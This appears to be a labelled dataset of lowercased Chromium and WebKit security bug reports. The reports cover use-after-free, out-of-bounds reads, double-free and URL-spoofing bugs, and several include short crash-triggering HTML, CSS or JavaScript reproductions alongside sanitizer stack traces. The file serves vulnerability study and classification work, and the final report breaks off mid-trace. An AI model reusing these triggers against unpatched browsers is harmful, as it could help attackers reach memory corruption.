regression use-after-free in counternode insertafter vulnerability details counter related use after free without memory debugging tools it just hangs forever asan and vg say it s use after free version chrome version daily canary trunk operating system linux 64bit win7 bisect-builds puts it here probably the webkit roll to 88326 reproduction case attached for crashes please include the following additional information type of crash renderer/hang crash state invalid read of size 8 at webcore counternode insertafter webcore counternode webcore counternode wtf atomicstring const counternode.cpp:202 address is 16 bytes inside a block of size 72 free d	11
zdi-can-1283 webkit fontface invalid font family remote code execution vulnerability zdi-can-1283 webkit fontface invalid font family remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products webkit vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of webkit user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the parsing and utilization of font objects when the code parses the font-face css element it does not validate that the font-family is legitimate later if the same font-family is applied within css the code will access an invalid element of its internal font object this can be leveraged by a remote attacker to execute code under the context of the user running the browser version s tested platform s tested this is due to an invalid font-family being defined within font-face and then it s subsequent use in pure css font-face font-family aaaa src url safe.ttf html background white body font-family aaaa font-size 50px height 2ex width 2ex background blue credit this vulnerability was discovered by wushi of team509 further details if supporting files were supplied with this report they are contained within a password-protected zip file the password is the zdi candidate number in form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days from the reported date at any point leading up to the deadline if you are ready to release a patch please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time kate fly security liaison tippingpoint zdi-disclosures tippingpoint.com office 1 512.681.8219 our pgp key is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
use after free in webcore findplaintext vulnerability details version chrome version stable trunk operating system linux 64bit reproduction case script function x document.body.offsetheight document.body.innerhtml window.find a script body onload x a body for crashes please include the following additional information 18653 error addresssanitizer crashed on address at pc bp sp read of size 2 at thread t0 0 in void wtf vector unsigned short 0ul append unsigned short unsigned short const unsigned long 0 1 in webcore findplaintext webcore range const wtf string const unsigned int media/base/yuv_row_table.cc:0 is located 0 bytes to the right of 34-byte region allocated by thread t0 here 0 in malloc asan_rtl 1 in wtf fastmalloc unsigned long media/base/yuv_row_table.cc:0	11
security v8 asserts crashes when entering simple js snippit vulnerability details in any debug linux build of chrome using v8 version 3.5.2 r8765 or later open the js console on the new tab page and enter the following code window.opener=null object.getownpropertynames window in the debug build v8 asserts because it tries to write a value a java script object a property name beyond the end of a fixedarray in the gc heap in the release build the write succeeds potentially likely corrupting the gc heap if somebody was clever they could create an object with property keys that were smis arbitrary values and write them to unexpected places in the heap version debug linux build of chrome using v8 version 3.5.2 r8765 or later but very likely in earlier versions as well have n't traced through the svn history yet reproduction case see above	11
use after free in webcore scriptwrappable wrapper product chrome stack signature webcore v8domwrapper getwrapper webcore node 291771b new signature label webcore v8domwrapper getwrapper webcore node new signature hash b481ee50_a1607049_4ded6ec1_57e78ce0_f78ca6b2 report link meta information product name chrome product version 10.0.648.134 report id 54b54a48b8604930 report time 2011/03/19 02:02:45 sat uptime 372 sec cumulative uptime 0 sec os name windows nt os version 5.1.2600 service pack 3 cpu architecture x86 cpu info genuineintel family 6 model 22 stepping 1 a valrind/memcheck report with similar stack was seen on cross_fuzz 26925 invalid read of size 8 26925 at webcore scriptwrappable wrapper const third_party/webkit/source/webcore/bindings/v8/scriptwrappable.h:42 26925 by webcore v8domwrapper getwrapper webcore node third_party/webkit/source/webcore/bindings/v8/v8domwrapper.h:128 26925 by webcore tov8 webcore node bool out/release/obj/gen/webkit/bindings/v8node.h:74 26925 by webcore tov8 webcore cssstylesheet third_party/webkit/source/webcore/bindings/v8/custom/v8cssstylesheetcustom.cpp:47 26925 by webcore tov8 webcore stylesheet third_party/webkit/source/webcore/bindings/v8/custom/v8stylesheetcustom.cpp:45 26925 by v8 handle v8 value webcore getv8object webcore stylesheet webcore stylesheet third_party/webkit/source/webcore/bindings/v8/v8collection.h:49 26925 by v8 handle v8 value webcore getindexedpropertyofcollection webcore stylesheetlist webcore stylesheet unsigned int v8 local v8 object third_party/webkit/source/webcore/bindings/v8/v8collection.h:95 26925 by v8 handle v8 value webcore collectionindexedpropertygetter webcore stylesheetlist webcore stylesheet unsigned int v8 accessorinfo const third_party/webkit/source/webcore/bindings/v8/v8collection.h:101 26925 by v8 internal jsobject haselementwithinterceptor v8 internal jsobject unsigned int v8/src/objects.cc:6745 26925 by v8 internal jsobject getpropertyattributewithreceiver v8 internal jsobject v8 internal string v8/src/objects.cc:2171 26925 by v8 internal jsobject hasproperty v8 internal string v8/src/objects.h:1461 26925 by v8 internal runtime_hasproperty v8 internal arguments v8/src/runtime.cc:4068 26925 by 26925 by 26925 address is 32 bytes inside a block of size 144 free d 26925 at operator delete void home/kcc/drt/trunk/third_party/valgrind/coregrind/m_replacemalloc/vg_replace_malloc.c:915 26925 by webcore domdatastore weaknodecallback v8 persistent v8 value void third_party/webkit/source/webcore/bindings/v8/domdatastore.cpp:173 26925 by v8 internal globalhandles node postgarbagecollectionprocessing v8/src/global-handles.cc:191 26925 by v8 internal globalhandles postgarbagecollectionprocessing v8/src/global-handles.cc:403 26925 by v8 internal heap performgarbagecollection v8 internal garbagecollector v8 internal gctracer v8/src/heap.cc:777 26925 by v8 internal heap collectgarbage v8 internal allocationspace v8 internal garbagecollector v8/src/heap.cc:509 26925 by webcore domdatastore weaknodecallback does last deref but the bug might be somewhere else we had somewhat similar issue 70106	11
yet another double-free caused by malformed xpath expression in xslt this bug is quite similar in nature to issue 63444 and 89402 when the xpath engine processes some malformed expression say book hello world 1 it first evaluates the book part resulting in a node set filled with book elements after that each of these elements is set as the new context node where subsequent predicate hello world is evaluated this evaluation happens in function xmlxpathcompopevalpositionalpredicate of xpath.c and after a series of calls from that function control finally moves into xmlxpathcompopeval where the following code is executed 13392 if op value5 null 13393 func 13394 xmlxpathfunctionlookup ctxt context 13395 op value4 13396 else 13397 uri xmlxpathnslookup ctxt context op value5 13398 if uri null 13399 xmlgenericerror xmlgenericerrorcontext 13400 xmlxpathcompopeval function s bound to undefined prefix s\n 13401 char op value4 char op value5 13402 return total 13403 13404 func xmlxpathfunctionlookupns ctxt context 13405 op value4 uri 13406 13407 if func null 13408 xmlgenericerror xmlgenericerrorcontext 13409 xmlxpathcompopeval function s not found\n 13410 char op value4 13411 xp_error0 xpath_unknown_func_error 13412 the code first calls xmlxpathnslookup to look for the namespace prefix hello which obviously would fail and return null then this failure is signaled by a call to xmlgenericerror and control returns afterwards without setting any flags to indicate this error like the code in line 13411 does 14036 xmlxpathcompopeval ctxt op 14037 if ctxt error xpath_expression_ok 14038 return 1 14039 14040 resobj valuepop ctxt 14041 if resobj null 14042 return 1 14043 break 14044 14045 14046 if resobj 14047 int res 14048 14049 if resobj type xpath_boolean 14050 res resobj boolval 14051 else if ispredicate 14052 14053 for predicates a result of type number is handled 14054 differently 14055 spec xpath 1.0 14056 if the result is a number the result will be converted 14057 to true if the number is equal to the context position 14058 and will be converted to false otherwise 14059 14060 res xmlxpathevaluatepredicateresult ctxt resobj 14061 else 14062 res xmlxpathcasttoboolean resobj 14063 14064 xmlxpathreleaseobject ctxt context resobj 14065 return res 14066 now we ve returned from xmlxpathcompopeval at line 14036 since the error check in line 14037 does n't reveal anything exceptional the code assumes the xpath function was found and its result had been placed in the value table so this resobj is popped up from the value table line 14040 converted to a boolean value line 14060 and finally released by xmlxpathreleaseobject line 14064 actually this resobj is the context object wrapping one of the book elements from the aforementioned node set this context object would be explicitly released afterwards resulting in a double-free bug version chrome version 13.0.782.112 official build 95650 15.0.857.0 developer build 97295 operating system windows xp sp3 reproduction case please see the attached files repro.html demo.xml and demo.xsl put them in the same web directory load repro.html in the browser and a sad tab would show up	7
x509certificate cache usage pattern may result in use after free a race condition exists between cache find used by the x509certificate createfrom methods and cache remove called by the dtor of x509certificate once the last reference is released thread a release the last reference to an x509certificate thread b calls cache find which acquires lock thread a x509certificate dtor invokes and calls cache remove which blocks on lock thread b finds the x509certificate that is dtoring in thread a and returns it releasing lock thread a acquires lock removes the x509certificate and then proceeds with dtor thread b now holds a dead pointer may attempt to addref on it as part of adding it to a scoped_refptr or may attempt to use it directly in debug mode this use pattern may dcheck because the refcountedthreadsafebase will set in_dtor to be true once the last reference is released and dchecks if addref is called after the fact however this is only in debug mode and only if the certificate is stored in a scoped_refptr and only if the memory is not zero d out which means in_dtor would no longer assert	11
chromium use activex flash not the npapi one with potential wininet cookie leak i encountered this strange but working html snippet from a spam site embed mediatype 0 type application/x-mplayer2 pluginspage src width 450 height 400 autostart true loop true menu true embed instead of embed a adobe flash directly it use wmp as a container thus it s using flash10h.ocx not npswf32.dll you can confirm this by enumerate the loaded dll of chrome.exe and i guess it s also using ie s wininet stack so in theory it can track down user even if switch your browser i do n't know what zone the wmp plugin for chromium is running but last i checked my registry from lockdown_zone 0 to 5 hklm\software\microsoft\windows\currentversion\internet settings\lockdown_zones\0 1200 dword:00000003	2
build with fpie chrome version from the about version page 7.0.544.0 developer build 61396 os version gentoo cpu architecture 32-bit 64-bit 64-bit since commit all source files of chromium are built with fpic fpic should be only used to compile shared libs most of chromium binaries are n't shared libs fpie should be used for compilation of non-shared part of chromium for better performance	9
security do not ignore type on object chrome makes it possible to do the following object data type foo/bar height=500 width=500 object unfortunately this seems unsafe consider a case where example.com wants to embed a harmless video from evil.com and expresses this intent with type video/x-ms-wmv but the victim s browser does not have a plugin that claims this particular mime type in this case if evil.com returns application/x-shockwave-flash instead the returned applet can unexpectedly disrupt the embedding page e.g navigate away which does not seem desirable i d propose never ignoring type or object or embed even if the value is not recognized and in a perfect world content-type and type should be required to match but that s not going to happen	9
url spoof through bookmark bar click test chrome 12.0.712.0 dev windows xp sp3 1 open testcase.htm 2 shift+ctrl+b 3 click a link through bookmark	9
chrome spoof on 302 redirect test chrome 13.0.767.1 windows xp sp3	9
oob read in media ffmpegvideodecodeengine initialize caught this using inferno s fuzzer unless this tool is mistaken the guts of avcodec_open read past the allocated memory region and maybe write afterwards unfortunately the stack above avcodec_open is not symbolized i am working on that there are some crashes with media ffmpegvideodecodeengine initialize in it read of size 4 at shadow mem thread 0 1 2 3 4 5 6 7 avcodec_open 8 media ffmpegvideodecodeengine initialize media/video/ffmpeg_video_decode_engine.cc:146 9 media ffmpegvideodecoder initialize media/filters/ffmpeg_video_decoder.cc:82 10 anonymous namespace taskclosureadapter run base/message_loop.cc:100 11 base callback void run const base/callback.h:252 12 messageloop deferorrunpendingtask messageloop pendingtask base/message_loop.cc:480 13 messageloop dowork base/message_loop.cc:670 14 base messagepumpdefault run base messagepump delegate base/message_pump_default.cc:23 15 messageloop runinternal base/message_loop.cc:438 16 messageloop runhandler base/message_loop.cc:410 17 base thread threadmain base/threading/thread.cc:164 18 threadfunc base/threading/platform_thread_posix.cc:51 19 20 is the address located 0 bytes to the right of region allocated memory of 2765 bytes allocated by thread here 0 posix_memalign home/kcc/asan/asan/asan_rtl.cc:1226 1 2 media ffmpegvideodecodeengine initialize media/video/ffmpeg_video_decode_engine.cc:76 3 media ffmpegvideodecoder initialize media/filters/ffmpeg_video_decoder.cc:82 4 anonymous namespace taskclosureadapter run base/message_loop.cc:100 5 base callback void run const base/callback.h:252 6 messageloop deferorrunpendingtask messageloop pendingtask base/message_loop.cc:480 7 messageloop dowork base/message_loop.cc:670 8 base messagepumpdefault run base messagepump delegate base/message_pump_default.cc:23 9 messageloop runinternal base/message_loop.cc:438	11
memory corruption in video decoding using details provided in 84938 i managed to reproduce an issue in video decoding that i was hitting during fuzzing repro is attached	11
url bar spoofing using history.back and history.forward vulnerability details url bar spoofing using history.back and history.forward version chrome version 12.0.742.100 stable beta or dev operating system windows 7 reproduction case click on the link window.open load spoofing.php page 1 document.location load spoofing.php page 2 reload redirect on linkedin.com history.back x 2 history.forward actual results url bar is spoofed with valid ssl tls indicia	9
use after free due to document destruction within unload event vulnerability details chrome tab is crashing when loading specifically crafted page svg file is loaded from object then event onunload is attached to any object in svg file then page is reloaded event calls functions like write writeln open for document that is already unloaded and crash happens crash place depends on how many objects were before last object and how data data was loaded in object generally crash happens all a time with code provided in test cases see attachments functions body_start and event_code with producing in most cases following common stack trace 0012f53c 01cba6f7 00000000 01cbac5e 018d8200 chrome_1c30000 webcore frameloader detachchildren d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\frameloader.cpp 2552 0012f544 01cbac5e 018d8200 018d8200 00f14c80 chrome_1c30000 webcore frameloader setdocumentloader d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\frameloader.cpp 1824 0012f560 01cba8cb 018d8200 00000000 00f07000 chrome_1c30000 webcore frameloader transitiontocommitted d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\frameloader.cpp 2015 0012f6f8 01d2703b 00f07040 01d27094 01868b04 chrome_1c30000 webcore frameloader commitprovisionalload d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\frameloader.cpp 1912 0012f700 01d27094 01868b04 01dc633f 01670000 chrome_1c30000 webcore documentloader commitifready d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\documentloader.cpp 280 0012f708 01dc633f 01670000 00000769 01868b00 chrome_1c30000 webcore documentloader commitload d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\documentloader.cpp 300 0012f71c 01dc5b46 01670000 00000769 00000000 chrome_1c30000 webcore mainresourceloader adddata d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\mainresourceloader.cpp 163 0012f734 01dc6ba3 01670000 00000769 ffffffff chrome_1c30000 webcore resourceloader didreceivedata d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\resourceloader.cpp 283 0012f75c 01dc5e56 01670000 00000769 ffffffff chrome_1c30000 webcore mainresourceloader didreceivedata d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\mainresourceloader.cpp 455 0012f790 01fd9856 00ebd470 01670000 00000769 chrome_1c30000 webcore resourceloader didreceivedata d b\build\slave\chrome-official\build\src\third_party\webkit\source\webcore\loader\resourceloader.cpp 431 0012f7a4 02565820 0137f698 01670000 00000769 chrome_1c30000 webcore resourcehandleinternal didreceivedata d b\build\slave\chrome-official\build\src\third_party\webkit\source\webkit\chromium\src\resourcehandle.cpp 171 0012f7c4 02014fb4 01670000 00000769 ffffffff chrome_1c30000 webkit_glue weburlloaderimpl context onreceiveddata d b\build\slave\chrome-official\build\src\webkit\glue\weburlloader_impl.cc 620 0012f824 0201553a 019cf6d0 00000049 000000e4 chrome_1c30000 resourcedispatcher onreceiveddata d b\build\slave\chrome-official\build\src\content\common\resource_dispatcher.cc 358 0012f860 02014dc7 019cf6d0 00f19004 0012fb48 chrome_1c30000 resourcedispatcher dispatchmessagew d b\build\slave\chrome-official\build\src\content\common\resource_dispatcher.cc 504 0012f87c 0200b6c4 019cf6d0 0012f8b4 01ff49de chrome_1c30000 resourcedispatcher onmessagereceived d b\build\slave\chrome-official\build\src\content\common\resource_dispatcher.cc 282 0012f894 022abf40 019cf6d0 0012fc50 021bc998 chrome_1c30000 childthread onmessagereceived d b\build\slave\chrome-official\build\src\content\common\child_thread.cc 149 0012f8a0 021bc998 0012f900 00f26518 0012fb48 chrome_1c30000 runnablemethod memorydetails void thiscall memorydetails std vector processmemoryinformation std allocator processmemoryinformation const tuple1 std vector processmemoryinformation std allocator processmemoryinformation run d b\build\slave\chrome-official\build\src\base\task.h 332 0012f8c0 021bca1f 00000000 019cf6c0 0012fb48 chrome_1c30000 messageloop runtask d b\build\slave\chrome-official\build\src\base\message_loop.cc 372 0012f8d0 021bcdba 0012fb48 00f0ec20 00f0ec30 chrome_1c30000 messageloop deferorrunpendingtask d b\build\slave\chrome-official\build\src\base\message_loop.cc 383 0012f900 021d3525 00f19004 0012fb48 00000000 chrome_1c30000 messageloop dowork d b\build\slave\chrome-official\build\src\base\message_loop.cc 573 0012f92c 021bc919 0012fb48 02e638f0 021bc89e chrome_1c30000 base messagepumpdefault run d b\build\slave\chrome-official\build\src\base\message_pump_default.cc 50 0012f938 021bc89e 00000000 021bc792 00000000 chrome_1c30000 messageloop runinternal d b\build\slave\chrome-official\build\src\base\message_loop.cc 347 0012f940 021bc792 00000000 00000001 00f19000 chrome_1c30000 messageloop runhandler d b\build\slave\chrome-official\build\src\base\message_loop.cc 319 0012f960 01c3f644 0012fde0 00000001 02e631a8 chrome_1c30000 messageloop run d b\build\slave\chrome-official\build\src\base\message_loop.cc 244 0012fc7c 01c341e7 0012fcc8 00765088 00765518 chrome_1c30000 renderermain d b\build\slave\chrome-official\build\src\content\renderer\renderer_main.cc 234 0012fe3c 004020f9 00400000 0012ff1c 00020998 chrome_1c30000 chromemain d b\build\slave\chrome-official\build\src\chrome\app\chrome_main.cc 821 0012fec4 0040423d 00400000 0012ff1c fffffffe chrome maindllloader launch d b\build\slave\chrome-official\build\src\chrome\app\client_util.cc 250 0012ff30 00453a1b 00400000 00000000 00020a62 chrome wwinmain d b\build\slave\chrome-official\build\src\chrome\app\chrome_exe_main_win.cc 46 0012ffc0 7c817077 05382e08 0364f258 7ffdb000 chrome tmaincrtstartup f dd\vctools\crt_bld\self_x86\crt\src\crt0.c 263 0012fff0 00000000 00453a86 00000000 78746341 kernel32 baseprocessstart after which for every test case stack continuation may vary 0012f87c is last common for all crashes several notes about test cases 1 looks like it does not matters which svg files are loaded and what they contain 2 in test case event_code function document.write document.open and document.writeln produce equal results crash 3 for test case nr.3 two times appeared error 416 requested range not satisfiable and then disappeared without any code modifications maybe even another bug at all 4 ca n't detect when but sometimes instead of aw snap appeared tab it s dead jim only on windows on linux it is aw snap all a time 5 when placing into tag body onload event for any function event empty it affected note 4 5 notes 3 4 and 5 may be the cause of caching issue in chrome when data is not able to be loaded in object it takes from cache old files 6 sometimes test case page needs to be reloded after it has been already reloaded after location.reload 7 for some test cases may be produced two diffrent crash places for test case named not-working-tc1 there is debugging information included but unfortunately later i was unable to reproduce it with equal results later it resulted in the same stack trace as in test case nr.2 ps probably there are only null pointer dereferences and not dangerous invalid memory reads but i have marked this bug as security just for sure it could require more investigation for more correct conclusions version windows xp sp3 12.0.742.112 stable 12.0.742.122 stable 14.0.814.0 canary 14.0.814.0 dev-m ubuntu 10.04 12.0.742.112 stable reproduction case see below attached test cases with debugging information only for windows	11
documentloader use after free in kurl strippedforuseasreferrer vulnerability details as per discussion with inferno one day i was able to reproduce the 456 inside 3176 bug in a browser with valgrind but otherwise these are reproducing in dumprendertree compiled with asan stack is either reply 7030 error addresssanitizer crashed on address at pc bp sp read of size 1 at thread t0 is located 456 bytes inside of 3176-byte region freed by thread t0 here previously allocated by thread t0 here stats 0m freed by 0 calls stats 0m really freed by 0 calls webcore kurl strippedforuseasreferrer webcore frameloader setoutgoingreferrer webcore documentwriter begin webcore documentwriter replacedocument webcore scriptcontroller executeifjavascripturl webcore subframeloader requestframe or reply 20114 error addresssanitizer crashed on address at pc bp sp read of size 8 at thread t0 is located 8 bytes inside of 16-byte region freed by thread t4 here previously allocated by thread t4 here thread t4 created by t0 here stats 0m freed by 0 calls stats 0m really freed by 0 calls webcore kurlgoogleprivate init webcore kurl kurl webcore blankurl webcore document completeurl webcore htmllinkelement parsemappedattribute webcore styledelement attributechanged webcore element setattributemap with varying offset and size version chrome version dumprendertree on trunk compiled with asan operating system linux 64 bit reproduction case attached a bunch of files and dumprendertree logs for crashes please include the following additional information type of crash drt	11
possible url bar spoofing when history.forward is ignored using forward button vulnerability details in some cases after some window.location='attacker that are used history.forward can be ignored if the user goes forward on google chrome manually opens and closes a new tab location bar is spoofed view screenshot at this point history.forward works only manualy we ca n't use javascript for this we can just use window.open after the user goes forward not demonstrated yet in the testcase for the instant go forward manualy and open/close a new tab for enable the spoofing issue 86758 unpatched is a lot similare to this vulnerability but i think that this bug is a different vulnerability version chrome version 14.0.794.0 stable beta or dev operating system windows 7 reproduction case view testcase1.html with attacker.html	9
browser crash in net websocketjob sendpending vulnerability details full browser crash happens when sending messages via websockets to websockets server version windows xp sp3 12.0.742.122 stable 14.0.825.0 dev-m ubuntu 10.04 12.0.742.112 stable reproduction case to reproduce crash do the following 1 run websockets example server it requires twisted websockets from what was tested it seems that only mentioned example server causes chrome to crash and looks like is the reason for it there will be a bunch of python exceptions when running test case it s ok 2 run attached test case 3 wait several seconds for crash on linux crash happens much faster one important note be careful when testing this script it may completely freeze all the os at least it happened rarely on my virtualbox with windows for crashes please include the following additional information mini-dump debugging information and test case are in attachment	11
oob read in harfbuzz with khmer character vulnerability details 2583 error addresssanitizer crashed on address at pc bp sp read of size 2 at thread t0 0 in hb_opentypeshape media/base/yuv_row_table.cc:0 1 in hb_khmershape 0 version chrome version stable trunk operating system 64 bit linux reproduction case textarea style margin 6068 aaaaaaaaaaa style for crashes please include the following additional information	11
oob read in media scaleyuvtorgb32 due to failure to account for zero source width and accessing negative indices reproduce using out/release/chrome allow-file-access-from-files disable-webgl disable-accelerated-2d-canvas disable-accelerated-compositing disable-gpu-rendering disable-gpu-plugin single-process user-data-dir=/tmp/tt1 third_party/webkit/layouttests/media/test.html 2 1 third_party/asan/scripts/asan_symbolize.py c++filt 31203 error addresssanitizer crashed on address at pc bp sp read of size 1 at thread t12 0 in media scaleyuvtorgb32 unsigned char const unsigned char const unsigned char const unsigned char int int int int int int int media yuvtype media rotate media scalefilter chrome/src/media/base/yuv_convert.cc:298 1 in webkit_glue videorendererimpl fastpaint media videoframe skcanvas gfx rect const chrome/src/webkit/glue/media/video_renderer_impl.cc:300 2 in webkit_glue videorendererimpl paint skcanvas gfx rect const chrome/src/webkit/glue/media/video_renderer_impl.cc:67 3 in webkit_glue webmediaplayerimpl proxy paint skcanvas gfx rect const chrome/src/webkit/glue/webmediaplayer_impl.cc:129 4 in webkit_glue webmediaplayerimpl paint skcanvas webkit webrect const chrome/src/webkit/glue/webmediaplayer_impl.cc:654 5 in webkit webmediaplayerclientimpl paintcurrentframeincontext webcore graphicscontext webcore intrect const chrome/src/third_party/webkit/source/webkit/chromium/src/webmediaplayerclientimpl.cpp:451 6 in webcore rendervideo paintreplaced webcore paintinfo webcore intpoint const chrome/src/third_party/webkit/source/webcore/rendering/rendervideo.cpp:212 7 in webcore renderreplaced paint webcore paintinfo webcore intpoint const chrome/src/third_party/webkit/source/webcore/rendering/renderreplaced.cpp:153 8 in webcore renderimage paint webcore paintinfo webcore intpoint const chrome/src/third_party/webkit/source/webcore/rendering/renderimage.cpp:323 9 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2681 10 in webcore renderlayer paintlist wtf vector webcore renderlayer 0ul webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2740 11 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2702 12 in webcore renderlayer paintlist wtf vector webcore renderlayer 0ul webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2740 13 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2704 14 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject chrome/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2475 15 in webcore frameview paintcontents webcore graphicscontext webcore intrect const chrome/src/third_party/webkit/source/webcore/page/frameview.cpp:2511 16 in webcore scrollview paint webcore graphicscontext webcore intrect const chrome/src/third_party/webkit/source/webcore/platform/scrollview.cpp:1018 17 in webkit webframeimpl paintwithcontext webcore graphicscontext webkit webrect const chrome/src/third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:1946 18 in webkit webframeimpl paint skcanvas webkit webrect const chrome/src/third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:1957 19 in webkit webviewimpl paint skcanvas webkit webrect const chrome/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1131 20 in renderwidget paintrect gfx rect const gfx point const skia platformcanvas chrome/src/content/renderer/render_widget.cc:564 21 in renderwidget dodeferredupdate chrome/src/content/renderer/render_widget.cc:801 22 in renderwidget dodeferredupdateandsendinputack chrome/src/content/renderer/render_widget.cc:677 23 in renderwidget invalidationcallback chrome/src/content/renderer/render_widget.cc:672 24 in anonymous namespace taskclosureadapter run chrome/src/base/message_loop.cc:104 25 in messageloop runtask messageloop pendingtask const chrome/src/base/message_loop.cc:485 26 in messageloop deferorrunpendingtask messageloop pendingtask const chrome/src/base/message_loop.cc:502 27 in messageloop dowork chrome/src/base/message_loop.cc:693 28 in base messagepumpdefault run base messagepump delegate chrome/src/base/message_pump_default.cc:23 29 in messageloop runinternal chrome/src/base/message_loop.cc:451 30 in messageloop run chrome/src/base/message_loop.cc:349 31 in base thread threadmain chrome/src/base/threading/thread.cc:164 32 in base anonymous namespace threadfunc void chrome/src/base/threading/platform_thread_posix.cc:51 33 in asanthread threadstart home/kcc/asan/asan/asan_thread.cc:77 34 in start_thread 0 35 in clone 0 address is 42721 bytes below t12 s stack top allocated in frame 0 hint this may be a false positive if your program uses some custom stack unwind mechanism longjmp and c exceptions are supported thread t12 created by t0 here 0 in pthread_create asan_rtl 1 in base anonymous namespace createthread unsigned long bool base platformthread delegate unsigned long chrome/src/base/threading/platform_thread_posix.cc:109 2 in base platformthread create unsigned long base platformthread delegate unsigned long chrome/src/base/threading/platform_thread_posix.cc:203 3 in base thread startwithoptions base thread options const chrome/src/base/threading/thread.cc:74 4 in browserrenderprocesshost init bool chrome/src/content/browser/renderer_host/browser_render_process_host.cc:308 5 in renderviewhost createrenderview std basic_string unsigned short base string16_char_traits std allocator unsigned short const chrome/src/content/browser/renderer_host/render_view_host.cc:147 6 in tabcontents createrenderviewforrendermanager renderviewhost chrome/src/content/browser/tab_contents/tab_contents.cc:1834 7 in non-virtual thunk to tabcontents createrenderviewforrendermanager renderviewhost 0 8 in renderviewhostmanager initrenderview renderviewhost navigationentry const chrome/src/content/browser/tab_contents/render_view_host_manager.cc:560 9 in renderviewhostmanager navigate navigationentry const chrome/src/content/browser/tab_contents/render_view_host_manager.cc:101 10 in tabcontents navigatetoentry navigationentry const navigationcontroller reloadtype chrome/src/content/browser/tab_contents/tab_contents.cc:525 11 in tabcontents navigatetopendingentry navigationcontroller reloadtype chrome/src/content/browser/tab_contents/tab_contents.cc:519 12 in navigationcontroller navigatetopendingentry navigationcontroller reloadtype chrome/src/content/browser/tab_contents/navigation_controller.cc:1049 13 in navigationcontroller loadentry navigationentry chrome/src/content/browser/tab_contents/navigation_controller.cc:276 14 in browser navigate browser navigateparams chrome/src/chrome/browser/ui/browser_navigator.cc:451 15 in browserinit launchwithprofile opentabsinbrowser browser bool std vector browserinit launchwithprofile tab std allocator browserinit launchwithprofile tab const chrome/src/chrome/browser/ui/browser_init.cc:1022 16 in browserinit launchwithprofile processstartupurls std vector gurl std allocator gurl const chrome/src/chrome/browser/ui/browser_init.cc:932 17 in browserinit launchwithprofile processlaunchurls bool std vector gurl std allocator gurl const chrome/src/chrome/browser/ui/browser_init.cc:849 18 in browserinit launchwithprofile launch profile std vector gurl std allocator gurl const bool chrome/src/chrome/browser/ui/browser_init.cc:692 19 in browserinit launchbrowser commandline const profile filepath const bool int chrome/src/chrome/browser/ui/browser_init.cc:548 20 in browserinit processcmdlineimpl commandline const filepath const bool profile int browserinit chrome/src/chrome/browser/ui/browser_init.cc:1423 21 in browserinit start commandline const filepath const profile int chrome/src/./chrome/browser/ui/browser_init.h:38 22 in browsermain mainfunctionparams const chrome/src/chrome/browser/browser_main.cc:1973 23 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const mainfunctionparams const chrome/src/chrome/app/chrome_main.cc:540 24 in chromemain chrome/src/chrome/app/chrome_main.cc:871 25 in main chrome/src/chrome/app/chrome_exe_main_gtk.cc:46 26 in libc_start_main 0 27 in start 0 31203 aborting stats 0m malloced 0m for red zones by 0 calls stats 2m realloced by 7294 calls stats 0m freed by 0 